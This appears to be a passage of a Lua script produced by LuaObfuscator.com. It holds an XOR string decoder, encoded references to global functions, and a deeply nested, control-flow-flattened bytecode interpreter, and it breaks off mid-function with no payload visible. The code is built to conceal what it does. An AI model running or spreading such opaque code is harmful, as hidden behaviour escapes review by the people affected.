--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do
	local v0 = string.char;
	local v1 = string.byte;
	local v2 = string.sub;
	local v3 = bit32 or bit;
	local v4 = v3.bxor;
	local v5 = table.concat;
	local v6 = table.insert;
	local function v7(v24, v25)
		local v26 = 0;
		local v27;
		while true do
			if (1 == v26) then
				return v5(v27);
			end
			if (v26 == 0) then
				v27 = {};
				for v44 = 1, #v24 do
					v6(v27, v0(v4(v1(v2(v24, v44, v44 + 1)), v1(v2(v25, 1 + ((v44 - 1) % #v25), 1 + ((v44 - 1) % #v25) + 1))) % 256));
				end
				v26 = 1;
			end
		end
	end
	local v8 = _G[v7("\248\42\188\1\8\65\217\254", "\140\69\210\116\101\35\188")];
	local v9 = _G[v7("\195\107\225\92\18\34", "\176\31\147\53\124\69")][v7("\7\216\27\27", "\101\161\111\126")];
	local v10 = _G[v7("\68\157\57\63\250\80", "\55\233\75\86\148")][v7("\61\233\62\23", "\94\129\95\101\123\104")];
	local v11 = _G[v7("\159\111\190\58\130\124", "\236\27\204\83")][v7("\48\244\177", "\67\129\211\62\171\197\45\23")];
	local v12 = _G[v7("\227\194\1\219\169\60", "\144\182\115\178\199\91\43\221")][v7("\226\60\147\206", "\133\79\230\172")];
	local v13 = _G[v7("\197\217\14\255\39\226", "\182\173\124\150\73\133\44")][v7("\76\71\217", "\62\34\169\100\22")];
	local v14 = _G[v7("\214\122\113\139\199", "\162\27\19\231\162")][v7("\64\209\252\16\176\21", "\35\190\146\115\209\97")];
	local v15 = _G[v7("\58\7\196\239\43", "\78\102\166\131")][v7("\26\60\104\12\1\38", "\115\82\27\105")];
	local v16 = _G[v7("\59\18\249\39", "\86\115\141\79\39\217\233\76")][v7("\72\222\161\211\68", "\36\186\196\171\52\178\31\65")];
	local v17 = _G[v7("\90\28\239\115\2\28\227", "\61\121\155\21\103\114\149\217")] or function()
		return _ENV;
	end;
	local v18 = _G[v7("\244\60\168\243\52\196\15\243\56\190\242\52", "\135\89\220\158\81\176\110")];
	local v19 = _G[v7("\29\61\2\94\225", "\109\94\99\50\141\145\34")];
	local v20 = _G[v7("\29\19\1\87\214\38", "\110\118\109\50\181\82")];
	local v21 = _G[v7("\250\63\176\127\53\169", "\143\81\192\30\86\194")] or _G[v7("\106\4\136\36\190", "\30\101\234\72\219\46\148\217")][v7("\177\43\212\91\48\82", "\196\69\164\58\83\57\47\79")];
	local v22 = _G[v7("\187\85\232\171\165\73\249\189", "\207\58\134\222\200\43\156")];
	local function v23(v28, v29, ...)
		local v30 = 0;
		local v31;
		local v32;
		local v33;
		local v34;
		local v35;
		local v36;
		local v37;
		local v38;
		local v39;
		local v40;
		local v41;
		local v42;
		local v43;
		while true do
			if (v30 == 2) then
				v39 = nil;
				v40 = nil;
				v41 = nil;
				v42 = nil;
				v30 = 3;
			end
			if (v30 == 1) then
				v35 = nil;
				v36 = nil;
				v37 = nil;
				v38 = nil;
				v30 = 2;
			end
			if (0 == v30) then
				v31 = 0;
				v32 = nil;
				v33 = nil;
				v34 = nil;
				v30 = 1;
			end
			if (v30 == 3) then
				v43 = nil;
				while true do
					local v45 = 0;
					while true do
						if (0 == v45) then
							if (v31 == 0) then
								local v46 = 0;
								while true do
									if (v46 == 0) then
										v32 = (153 + 29) - (143 + 38);
										v33 = nil;
										v46 = 1;
									end
									if (v46 == 1) then
										v28 = v12(v11(v28, (1642 - (730 + 910)) + 3), v7("\55\250", "\25\212\150\163"), function(v54)
											if (v9(v54, (1101 - (847 + 252)) + (1462 - (650 + 812))) == (224 - 145)) then
												local v100 = 0;
												local v101;
												while true do
													if (v100 == 0) then
														v101 = 0;
														while true do
															if (v101 == 0) then
																local v118 = 0;
																while true do
																	if (0 == v118) then
																		v33 = v8(v11(v54, (2 - 1) - (0 + 0), 1 + 0));
																		return "";
																	end
																end
															end
														end
														break;
													end
												end
											else
												local v102 = 0;
												local v103;
												local v104;
												while true do
													if (v102 == 1) then
														while true do
															if (v103 == 0) then
																v104 = v10(v8(v54, 46 - 30));
																if v33 then
																	local v137 = 0;
																	local v138;
																	local v139;
																	while true do
																		if (1 == v137) then
																			while true do
																				local v166 = 0;
																				while true do
																					if (v166 == 0) then
																						if (v138 == 1) then
																							return v139;
																						end
																						if (v138 == 0) then
																							local v171 = 0;
																							while true do
																								if (1 == v171) then
																									v138 = 1;
																									break;
																								end
																								if (v171 == 0) then
																									v139 = v13(v104, v33);
																									v33 = nil;
																									v171 = 1;
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			break;
																		end
																		if (v137 == 0) then
																			v138 = 0;
																			v139 = nil;
																			v137 = 1;
																		end
																	end
																else
																	return v104;
																end
																break;
															end
														end
														break;
													end
													if (v102 == 0) then
														v103 = 0;
														v104 = nil;
														v102 = 1;
													end
												end
											end
										end);
										v31 = 1;
										break;
									end
								end
							end
							if (v31 == 3) then
								local v47 = 0;
								while true do
									if (v47 == 0) then
										v37 = nil;
										function v37()
											local v55 = 0;
											local v56;
											local v57;
											local v58;
											local v59;
											local v60;
											while true do
												if (v55 == 0) then
													v56 = 0 - 0;
													v57 = nil;
													v55 = 1;
												end
												if (v55 == 1) then
													v58 = nil;
													v59 = nil;
													v55 = 2;
												end
												if (v55 == 2) then
													v60 = nil;
													while true do
														local v111 = 0;
														while true do
															if (0 == v111) then
																if (v56 == 0) then
																	local v121 = 0;
																	while true do
																		if (v121 == 0) then
																			v57, v58, v59, v60 = v9(v28, v32, v32 + (10 - (4 + 3)));
																			v32 = v32 + (1705 - ((6113 - 4480) + (125 - 57)));
																			v121 = 1;
																		end
																		if (v121 == 1) then
																			v56 = 1;
																			break;
																		end
																	end
																end
																if (v56 == 1) then
																	return (v60 * (((12993946 + 1611152) - 8017803) + (38711434 - 28521513))) + (v59 * 65536) + (v58 * 256) + v57;
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v47 = 1;
									end
									if (v47 == 1) then
										v38 = nil;
										v31 = 4;
										break;
									end
								end
							end
							v45 = 1;
						end
						if (2 == v45) then
							if (v31 == 7) then
								local v48 = 0;
								while true do
									if (v48 == 0) then
										function v43(v61, v62, v63)
											local v64 = 0;
											local v65;
											local v66;
											local v67;
											local v68;
											while true do
												if (v64 == 0) then
													v65 = 0;
													v66 = nil;
													v64 = 1;
												end
												if (v64 == 2) then
													while true do
														local v112 = 0;
														while true do
															if (v112 == 0) then
																if (v65 == 0) then
																	local v122 = 0;
																	while true do
																		if (v122 == 1) then
																			v65 = 1;
																			break;
																		end
																		if (v122 == 0) then
																			v66 = v61[2 - (1752 - (1342 + 409))];
																			v67 = v61[2];
																			v122 = 1;
																		end
																	end
																end
																if (v65 == 1) then
																	local v123 = 0;
																	while true do
																		if (v123 == 0) then
																			v68 = v61[3];
																			return function(...)
																				local v144 = 0;
																				local v145;
																				local v146;
																				local v147;
																				local v148;
																				local v149;
																				local v150;
																				while true do
																					if (v144 == 0) then
																						v145 = 0;
																						v146 = nil;
																						v144 = 1;
																					end
																					if (v144 == 2) then
																						v149 = nil;
																						v150 = nil;
																						v144 = 3;
																					end
																					if (3 == v144) then
																						while true do
																							if (v145 == 1) then
																								local v172 = 0;
																								while true do
																									if (v172 == 0) then
																										v148 = {...};
																										v149 = v20("#", ...) - 1;
																										v172 = 1;
																									end
																									if (1 == v172) then
																										v145 = 2;
																										break;
																									end
																								end
																							end
																							if (0 == v145) then
																								local v173 = 0;
																								while true do
																									if (v173 == 1) then
																										v145 = 1;
																										break;
																									end
																									if (v173 == 0) then
																										v146 = 1952 - (1617 + 334);
																										v147 = -(2 - 1);
																										v173 = 1;
																									end
																								end
																							end
																							if (v145 == 2) then
																								local v174 = 0;
																								while true do
																									if (v174 == 0) then
																										v150 = nil;
																										function v150()
																											local v185 = 0;
																											local v186;
																											local v187;
																											local v188;
																											local v189;
																											local v190;
																											local v191;
																											local v192;
																											local v193;
																											local v194;
																											local v195;
																											while true do
																												if (v185 == 0) then
																													v186 = v66;
																													v187 = v67;
																													v188 = v68;
																													v189 = v41;
																													v185 = 1;
																												end
																												if (v185 == 2) then
																													v193 = (v149 - v188) + (2 - 1);
																													v194 = nil;
																													v195 = nil;
																													while true do
																														local v196 = 0;
																														local v197;
																														while true do
																															if (0 == v196) then
																																v197 = 0;
																																while true do
																																	if (v197 == 0) then
																																		local v215 = 0;
																																		while true do
																																			if (v215 == 0) then
																																				v194 = v186[v146];
																																				v195 = v194[866 - ((1218 - 504) + 5 + 146)];
																																				v215 = 1;
																																			end
																																			if (v215 == 1) then
																																				v197 = 1;
																																				break;
																																			end
																																		end
																																	end
																																	if (v197 == 1) then
																																		if (v195 <= (7 + 9)) then
																																			if (v195 <= (5 + 2)) then
																																				if (v195 <= 3) then
																																					if (v195 <= (1 + 0)) then
																																						if (v195 > (0 + 0)) then
																																							local v224 = 0;
																																							local v225;
																																							local v226;
																																							while true do
																																								if (v224 == 0) then
																																									v225 = 0;
																																									v226 = nil;
																																									v224 = 1;
																																								end
																																								if (v224 == 1) then
																																									while true do
																																										if (v225 == 0) then
																																											v226 = v194[9 - 7];
																																											do
																																												return v21(v192, v226, v147);
																																											end
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																							end
																																						else
																																							v192[v194[(1198 + 599) - (584 + 543 + 668)]] = v192[v194[7 - 4]] + v194[4];
																																						end
																																					elseif (v195 == (1 + 1)) then
																																						for v292 = v194[2 - 0], v194[(2739 - 1470) - (112 + 389 + (1427 - 662))] do
																																							v192[v292] = nil;
																																						end
																																					else
																																						v192[v194[1 + 1 + 0 + 0]] = v62[v194[3 + 0 + (1279 - (695 + 584))]];
																																					end
																																				elseif (v195 <= (1859 - (1230 + 288 + 336))) then
																																					if (v195 > (376 - ((892 - (144 + 706)) + (716 - 386)))) then
																																						if not v192[v194[8 - 6]] then
																																							v146 = v146 + 1;
																																						else
																																							v146 = v194[3];
																																						end
																																					else
																																						local v230 = 0;
																																						local v231;
																																						local v232;
																																						local v233;
																																						while true do
																																							if (v230 == 1) then
																																								v233 = nil;
																																								while true do
																																									if (0 == v231) then
																																										local v310 = 0;
																																										while true do
																																											if (v310 == 0) then
																																												v232 = v194[2 + 0];
																																												v233 = v192[v194[3]];
																																												v310 = 1;
																																											end
																																											if (v310 == 1) then
																																												v231 = 1;
																																												break;
																																											end
																																										end
																																									end
																																									if (v231 == 1) then
																																										v192[v232 + (1914 - (221 + 1692))] = v233;
																																										v192[v232] = v233[v194[1 + (1980 - (979 + 998))]];
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																							if (v230 == 0) then
																																								v231 = 0;
																																								v232 = nil;
																																								v230 = 1;
																																							end
																																						end
																																					end
																																				elseif (v195 == 6) then
																																					local v234 = 0;
																																					local v235;
																																					local v236;
																																					while true do
																																						if (v234 == 0) then
																																							v235 = 0;
																																							v236 = nil;
																																							v234 = 1;
																																						end
																																						if (v234 == 1) then
																																							while true do
																																								if (v235 == 0) then
																																									v236 = v194[1303 - (831 + 470)];
																																									do
																																										return v192[v236](v21(v192, v236 + 1, v194[3]));
																																									end
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				else
																																					v192[v194[2 + 0 + 0 + 0]] = v192[v194[1 + 2]] % v192[v194[1311 - (582 + 725)]];
																																				end
																																			elseif (v195 <= ((6 + 14) - 9)) then
																																				if (v195 <= (1838 - (1685 + 144))) then
																																					if (v195 == ((1469 - (12 + 190)) - ((2888 - (903 + 845)) + (295 - 176)))) then
																																						v192[v194[5 - 3]] = v194[159 - (121 + 35)] + v192[v194[4]];
																																					else
																																						v192[v194[2]] = v192[v194[1895 - (841 + 1051)]] - v194[1231 - (745 + 482)];
																																					end
																																				elseif (v195 == (1 + 4 + (1226 - (752 + 469)))) then
																																					v192[v194[2]] = v192[v194[11 - (1909 - (406 + 1495))]][v194[(977 - (138 + 835)) + (0 - 0)]];
																																				else
																																					local v242 = 0;
																																					local v243;
																																					local v244;
																																					local v245;
																																					local v246;
																																					local v247;
																																					while true do
																																						if (v242 == 2) then
																																							v247 = nil;
																																							while true do
																																								if (v243 == 1) then
																																									local v315 = 0;
																																									while true do
																																										if (v315 == 0) then
																																											v147 = (v246 + v244) - 1;
																																											v247 = 0 - 0;
																																											v315 = 1;
																																										end
																																										if (v315 == 1) then
																																											v243 = 2;
																																											break;
																																										end
																																									end
																																								end
																																								if (v243 == 0) then
																																									local v316 = 0;
																																									while true do
																																										if (v316 == 0) then
																																											v244 = v194[(606 - (197 + 406)) - (1 - 0)];
																																											v245, v246 = v189(v192[v244](v21(v192, v244 + (1458 - (330 + 1127)), v147)));
																																											v316 = 1;
																																										end
																																										if (v316 == 1) then
																																											v243 = 1;
																																											break;
																																										end
																																									end
																																								end
																																								if (v243 == 2) then
																																									for v332 = v244, v147 do
																																										local v333 = 0;
																																										local v334;
																																										while true do
																																											if (v333 == 0) then
																																												v334 = 0;
																																												while true do
																																													if (v334 == 0) then
																																														v247 = v247 + (4 - 3);
																																														v192[v332] = v245[v247];
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																						if (0 == v242) then
																																							v243 = 0;
																																							v244 = nil;
																																							v242 = 1;
																																						end
																																						if (1 == v242) then
																																							v245 = nil;
																																							v246 = nil;
																																							v242 = 2;
																																						end
																																					end
																																				end
																																			elseif (v195 <= (37 - (43 - 19))) then
																																				if (v195 == (9 + 3)) then
																																					local v248 = 0;
																																					local v249;
																																					local v250;
																																					local v251;
																																					local v252;
																																					while true do
																																						if (v248 == 2) then
																																							while true do
																																								if (v249 == 0) then
																																									local v317 = 0;
																																									while true do
																																										if (v317 == 1) then
																																											v249 = 1;
																																											break;
																																										end
																																										if (v317 == 0) then
																																											v250 = v187[v194[3]];
																																											v251 = nil;
																																											v317 = 1;
																																										end
																																									end
																																								end
																																								if (v249 == 2) then
																																									for v335 = 2 - 1, v194[3 + 1] do
																																										local v336 = 0;
																																										local v337;
																																										local v338;
																																										while true do
																																											if (v336 == 0) then
																																												v337 = 0;
																																												v338 = nil;
																																												v336 = 1;
																																											end
																																											if (v336 == 1) then
																																												while true do
																																													if (v337 == 0) then
																																														local v379 = 0;
																																														while true do
																																															if (v379 == 1) then
																																																v337 = 1;
																																																break;
																																															end
																																															if (v379 == 0) then
																																																v146 = v146 + (2 - 1);
																																																v338 = v186[v146];
																																																v379 = 1;
																																															end
																																														end
																																													end
																																													if (v337 == 1) then
																																														if (v338[1 + 0] == (353 - (86 + 248))) then
																																															v252[v335 - (2 - 1)] = {v192,v338[2 + (3 - 2)]};
																																														else
																																															v252[v335 - (1 + 0)] = {v62,v338[751 - (460 + 288)]};
																																														end
																																														v191[#v191 + (1862 - (458 + 1403))] = v252;
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																									v192[v194[(3580 - 1808) - ((1379 - (82 + 627)) + 1100)]] = v43(v250, v251, v63);
																																									break;
																																								end
																																								if (v249 == 1) then
																																									local v319 = 0;
																																									while true do
																																										if (v319 == 0) then
																																											v252 = {};
																																											v251 = v18({}, {[v7("\101\251\169\0\54\32\15", "\58\164\192\110\82\69\119\146")]=function(v357, v358)
																																												local v359 = 0;
																																												local v360;
																																												local v361;
																																												while true do
																																													if (v359 == 1) then
																																														while true do
																																															if (v360 == 0) then
																																																local v388 = 0;
																																																while true do
																																																	if (v388 == 0) then
																																																		v361 = v252[v358];
																																																		return v361[856 - (605 + 250)][v361[(1184 - (538 + 645)) + (1384 - (924 + 459))]];
																																																	end
																																																end
																																															end
																																														end
																																														break;
																																													end
																																													if (v359 == 0) then
																																														v360 = 0;
																																														v361 = nil;
																																														v359 = 1;
																																													end
																																												end
																																											end,[v7("\137\153\5\84\161\175\5\85\179\190", "\214\198\107\49")]=function(v362, v363, v364)
																																												local v365 = 0;
																																												local v366;
																																												local v367;
																																												while true do
																																													if (v365 == 0) then
																																														v366 = 0;
																																														v367 = nil;
																																														v365 = 1;
																																													end
																																													if (v365 == 1) then
																																														while true do
																																															if (v366 == 0) then
																																																v367 = v252[v363];
																																																v367[1140 - (948 + 191)][v367[(1513 - (476 + 1033)) - (188 - (104 + 82))]] = v364;
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end});
																																											v319 = 1;
																																										end
																																										if (1 == v319) then
																																											v249 = 2;
																																											break;
																																										end
																																									end
																																								end
																																							end
																																							break;
																																						end
																																						if (v248 == 1) then
																																							v251 = nil;
																																							v252 = nil;
																																							v248 = 2;
																																						end
																																						if (v248 == 0) then
																																							v249 = 0;
																																							v250 = nil;
																																							v248 = 1;
																																						end
																																					end
																																				else
																																					local v253 = 0;
																																					local v254;
																																					local v255;
																																					while true do
																																						if (v253 == 0) then
																																							v254 = 0;
																																							v255 = nil;
																																							v253 = 1;
																																						end
																																						if (v253 == 1) then
																																							while true do
																																								if (v254 == 0) then
																																									v255 = v194[2 - 0];
																																									v192[v255](v21(v192, v255 + 1 + 0, v147));
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end
																																			elseif (v195 <= ((16 + 27) - (89 - 60))) then
																																				local v256 = 0;
																																				local v257;
																																				local v258;
																																				local v259;
																																				local v260;
																																				while true do
																																					if (v256 == 2) then
																																						while true do
																																							if (0 == v257) then
																																								local v321 = 0;
																																								while true do
																																									if (v321 == 1) then
																																										v257 = 1;
																																										break;
																																									end
																																									if (v321 == 0) then
																																										v258 = v194[1 + 1];
																																										v259 = v192[v258 + 2];
																																										v321 = 1;
																																									end
																																								end
																																							end
																																							if (v257 == 2) then
																																								if (v259 > ((0 + 0) - (0 - 0))) then
																																									if (v260 <= v192[v258 + (644 - (614 + 29))]) then
																																										local v368 = 0;
																																										local v369;
																																										while true do
																																											if (v368 == 0) then
																																												v369 = 0;
																																												while true do
																																													if (v369 == 0) then
																																														v146 = v194[3 + (0 - 0)];
																																														v192[v258 + 1 + (1156 - (595 + 559))] = v260;
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																								elseif (v260 >= v192[v258 + (1526 - (1286 + 239))]) then
																																									local v370 = 0;
																																									local v371;
																																									while true do
																																										if (v370 == 0) then
																																											v371 = 0;
																																											while true do
																																												if (0 == v371) then
																																													v146 = v194[14 - 11];
																																													v192[v258 + 1 + 2] = v260;
																																													break;
																																												end
																																											end
																																											break;
																																										end
																																									end
																																								end
																																								break;
																																							end
																																							if (v257 == 1) then
																																								local v322 = 0;
																																								while true do
																																									if (v322 == 0) then
																																										v260 = v192[v258] + v259;
																																										v192[v258] = v260;
																																										v322 = 1;
																																									end
																																									if (v322 == 1) then
																																										v257 = 2;
																																										break;
																																									end
																																								end
																																							end
																																						end
																																						break;
																																					end
																																					if (v256 == 1) then
																																						v259 = nil;
																																						v260 = nil;
																																						v256 = 2;
																																					end
																																					if (v256 == 0) then
																																						v257 = 0;
																																						v258 = nil;
																																						v256 = 1;
																																					end
																																				end
																																			elseif (v195 > (52 - 37)) then
																																				v192[v194[1 + 1]][v192[v194[1089 - (226 + 860)]]] = v194[(28 - 11) - (1 + 12)];
																																			else
																																				local v299 = 0;
																																				local v300;
																																				local v301;
																																				local v302;
																																				local v303;
																																				local v304;
																																				while true do
																																					if (v299 == 2) then
																																						v304 = nil;
																																						while true do
																																							if (v300 == 2) then
																																								for v351 = v301, v147 do
																																									local v352 = 0;
																																									local v353;
																																									while true do
																																										if (0 == v352) then
																																											v353 = 0;
																																											while true do
																																												if (0 == v353) then
																																													v304 = v304 + (1 - 0);
																																													v192[v351] = v302[v304];
																																													break;
																																												end
																																											end
																																											break;
																																										end
																																									end
																																								end
																																								break;
																																							end
																																							if (1 == v300) then
																																								local v342 = 0;
																																								while true do
																																									if (v342 == 1) then
																																										v300 = 2;
																																										break;
																																									end
																																									if (0 == v342) then
																																										v147 = (v303 + v301) - (3 - 2);
																																										v304 = (0 - 0) - 0;
																																										v342 = 1;
																																									end
																																								end
																																							end
																																							if (v300 == 0) then
																																								local v343 = 0;
																																								while true do
																																									if (v343 == 0) then
																																										v301 = v194[2 + (0 - 0)];
																																										v302, v303 = v189(v192[v301](v21(v192, v301 + (448 - (234 + 213)), v194[373 - (218 + 152)])));
																																										v343 = 1;
																																									end
																																									if (v343 == 1) then
																																										v300 = 1;
																																										break;
																																									end
																																								end
																																							end
																																						end
																																						break;
																																					end
																																					if (0 == v299) then
																																						v300 = 0;
																																						v301 = nil;
																																						v299 = 1;
																																					end
																																					if (v299 == 1) then
																																						v302 = nil;
																																						v303 = nil;
																																						v299 = 2;
																																					end
																																				end
																																			end
																																		elseif (v195 <= ((79 - 63) + 3 + 5)) then
																																			if (v195 <= 20) then
																																				if (v195 <= ((2 + 51) - 35)) then
																																					if (v195 == ((1162 + 663) - (1101 + 707))) then
																																						v192[v194[(5 + 0) - 3]] = {};
																																					else
																																						v192[v194[2]]();
																																					end
																																				elseif (v195 > (1107 - (787 + 301))) then
																																					v192[v194[2 + (0 - 0)]] = v63[v194[3 - (447 - (195 + 252))]];
																																				else
																																					v192[v194[2 + (1765 - (1517 + 248))]] = v192[v194[487 - (251 + 233)]];
																																				end
																																			elseif (v195 <= 22) then
																																				if (v195 == (83 - 62)) then
																																					local v266 = 0;
																																					local v267;
																																					local v268;
																																					local v269;
																																					local v270;
																																					while true do
																																						if (0 == v266) then
																																							v267 = 0;
																																							v268 = nil;
																																							v266 = 1;
																																						end
																																						if (v266 == 2) then
																																							while true do
																																								if (v267 == 1) then
																																									v270 = v192[v268 + ((2279 - (619 + 479)) - (85 + (2404 - 1310)))];
																																									if (v270 > 0) then
																																										if (v269 > v192[v268 + (487 - (202 + 284))]) then
																																											v146 = v194[(1896 - (92 + 1801)) + (0 - 0)];
																																										else
																																											v192[v268 + 3 + 0] = v269;
																																										end
																																									elseif (v269 < v192[v268 + (1364 - (1247 + 116))]) then
																																										v146 = v194[3];
																																									else
																																										v192[v268 + 1 + 2] = v269;
																																									end
																																									break;
																																								end
																																								if (0 == v267) then
																																									local v324 = 0;
																																									while true do
																																										if (v324 == 0) then
																																											v268 = v194[2];
																																											v269 = v192[v268];
																																											v324 = 1;
																																										end
																																										if (v324 == 1) then
																																											v267 = 1;
																																											break;
																																										end
																																									end
																																								end
																																							end
																																							break;
																																						end
																																						if (v266 == 1) then
																																							v269 = nil;
																																							v270 = nil;
																																							v266 = 2;
																																						end
																																					end
																																				else
																																					local v271 = 0;
																																					local v272;
																																					local v273;
																																					while true do
																																						if (v271 == 0) then
																																							v272 = 0;
																																							v273 = nil;
																																							v271 = 1;
																																						end
																																						if (v271 == 1) then
																																							while true do
																																								if (v272 == 0) then
																																									v273 = v194[(524 - (39 + 40)) - ((1432 - (483 + 743)) + (508 - 271))];
																																									v192[v273] = v192[v273](v21(v192, v273 + (1 - 0), v194[2 + 1]));
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end
																																			elseif (v195 > 23) then
																																				local v274 = 0;
																																				local v275;
																																				local v276;
																																				local v277;
																																				local v278;
																																				local v279;
																																				while true do
																																					if (v274 == 2) then
																																						v279 = nil;
																																						while true do
																																							if (1 == v275) then
																																								local v327 = 0;
																																								while true do
																																									if (v327 == 0) then
																																										v147 = (v278 + v276) - (1937 - (249 + 1687));
																																										v279 = 0 - 0;
																																										v327 = 1;
																																									end
																																									if (v327 == 1) then
																																										v275 = 2;
																																										break;
																																									end
																																								end
																																							end
																																							if (2 == v275) then
																																								for v339 = v276, v147 do
																																									local v340 = 0;
																																									local v341;
																																									while true do
																																										if (v340 == 0) then
																																											v341 = 0;
																																											while true do
																																												if (v341 == 0) then
																																													v279 = v279 + ((351 + 1180) - (358 + (1598 - 426)));
																																													v192[v339] = v277[v279];
																																													break;
																																												end
																																											end
																																											break;
																																										end
																																									end
																																								end
																																								break;
																																							end
																																							if (v275 == 0) then
																																								local v328 = 0;
																																								while true do
																																									if (v328 == 1) then
																																										v275 = 1;
																																										break;
																																									end
																																									if (v328 == 0) then
																																										v276 = v194[1 + 1];
																																										v277, v278 = v189(v192[v276](v192[v276 + (2 - 1) + (189 - (88 + 101))]));
																																										v328 = 1;
																																									end
																																								end
																																							end
																																						end
																																						break;
																																					end
																																					if (v274 == 1) then
																																						v277 = nil;
																																						v278 = nil;
																																						v274 = 2;
																																					end
																																					if (v274 == 0) then
																																						v275 = 0;
																																						v276 = nil;
																																						v274 = 1;
																																					end
																																				end
																																			else
																																				do
																																					return;
																																				end
																																			end
																																		elseif (v195 <= 28) then
																																			if (v195 <= ((1563 - (298 + 313)) - ((700 - 479) + (1442 - (236 + 501))))) then
																																				if (v195 > (41 - 16)) then
																																					v192[v194[(331 - (123 + 204)) - 2]] = v192[v194[10 - 7]] % v194[(14 - 10) + (0 - 0)];
																																				else
																																					local v281 = 0;
																																					local v282;
																																					local v283;
																																					while true do
																																						if (v281 == 1) then
																																							while true do
																																								if (v282 == 0) then
																																									v283 = v194[2];
																																									v192[v283](v192[v283 + 1 + 0]);
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																						if (v281 == 0) then
																																							v282 = 0;
																																							v283 = nil;
																																							v281 = 1;
																																						end
																																					end
																																				end
																																			elseif (v195 == 27) then
																																				v192[v194[(3 - 1) + (0 - 0)]] = v194[(28 - 16) - (9 + 0)];
																																			else
																																				v146 = v194[14 - 11];
																																			end
																																		elseif (v195 <= ((130 - 81) - (15 + 4))) then
																																			if (v195 > (1989 - (526 + 1434))) then
																																				v192[v194[(522 - (17 + 175)) - ((474 - 192) + 46)]][v192[v194[3]]] = v192[v194[9 - 5]];
																																			elseif (v192[v194[1815 - (1775 + 38)]] == v194[(1464 - (318 + 1138)) - (3 + 1)]) then
																																				v146 = v146 + 1;
																																			else
																																				v146 = v194[(3000 - 2023) - ((1655 - 1186) + 463 + 42)];
																																			end
																																		elseif (v195 <= 31) then
																																			local v289 = 0;
																																			local v290;
																																			local v291;
																																			while true do
																																				if (v289 == 1) then
																																					while true do
																																						if (v290 == 0) then
																																							v291 = v194[2 - 0];
																																							v192[v291] = v192[v291](v21(v192, v291 + 1 + 0 + (955 - (692 + 263)), v147));
																																							break;
																																						end
																																					end
																																					break;
																																				end
																																				if (v289 == 0) then
																																					v290 = 0;
																																					v291 = nil;
																																					v289 = 1;
																																				end
																																			end
																																		elseif (v195 == ((13 + 31) - (40 - 28))) then
																																			v192[v194[1 + 1]] = v192[v194[4 - (2 - 1)]][v192[v194[(21 - 14) - 3]]];
																																		else
																																			v192[v194[2 + 0]] = #v192[v194[3]];
																																		end
																																		v146 = v146 + 1 + 0 + 0 + 0;
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													end
																													break;
																												end
																												if (v185 == 1) then
																													v190 = {};
																													v191 = {};
																													v192 = {};
																													for v198 = 0 + 0, v149 do
																														if (v198 >= v188) then
																															v190[v198 - v188] = v148[v198 + 1 + 0];
																														else
																															v192[v198] = v148[v198 + (2 - 1)];
																														end
																													end
																													v185 = 2;
																												end
																											end
																										end
																										v174 = 1;
																									end
																									if (1 == v174) then
																										v145 = 3;
																										break;
																									end
																								end
																							end
																							if (v145 == 3) then
																								_G['A'], _G['B'] = v41(v19(v150));
																								if not _G['A'][1 + 0 + (0 - 0)] then
																									local v177 = 0;
																									local v178;
																									local v179;
																									while true do
																										if (v177 == 1) then
																											while true do
																												if (v178 == 0) then
																													v179 = v61[11 - 7][v146] or "?";
																													error(v7("\218\187\62\231\150\253\248\41\252\148\230\170\108\239\146\169\131", "\137\216\76\142\230") .. v179 .. v7("\67\220", "\30\230\80\194") .. _G['A'][2]);
																													break;
																												end
																											end
																											break;
																										end
																										if (0 == v177) then
																											v178 = 0;
																											v179 = nil;
																											v177 = 1;
																										end
																									end
																								else
																									return v21(_G['A'], (244 - (5 + 237)) - 0, _G['B']);
																								end
																								break;
																							end
																						end
																						break;
																					end
																					if (v144 == 1) then
																						v147 = nil;
																						v148 = nil;
																						v144 = 2;
																					end
																				end
																			end;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v64 == 1) then
													v67 = nil;
													v68 = nil;
													v64 = 2;
												end
											end
										end
										return v43(v42(), {}, v29)(...);
									end
								end
							end
							if (v31 == 6) then
								local v49 = 0;
								while true do
									if (v49 == 0) then
										v42 = nil;
										function v42()
											local v69 = 0;
											local v70;
											local v71;
											local v72;
											local v73;
											local v74;
											local v75;
											local v76;
											while true do
												if (1 == v69) then
													v72 = nil;
													v73 = nil;
													v69 = 2;
												end
												if (2 == v69) then
													v74 = nil;
													v75 = nil;
													v69 = 3;
												end
												if (v69 == 3) then
													v76 = nil;
													while true do
														local v113 = 0;
														while true do
															if (v113 == 0) then
																if (0 == v70) then
																	local v124 = 0;
																	while true do
																		if (v124 == 1) then
																			v73 = {};
																			v70 = 1;
																			break;
																		end
																		if (v124 == 0) then
																			v71 = {};
																			v72 = {};
																			v124 = 1;
																		end
																	end
																end
																if (v70 == 2) then
																	local v125 = 0;
																	while true do
																		if (0 == v125) then
																			for v151 = 2 - 1, v75 do
																				local v152 = 0;
																				local v153;
																				local v154;
																				local v155;
																				while true do
																					if (v152 == 0) then
																						v153 = 0;
																						v154 = nil;
																						v152 = 1;
																					end
																					if (v152 == 1) then
																						v155 = nil;
																						while true do
																							if (1 == v153) then
																								if (v154 == (2 - 1)) then
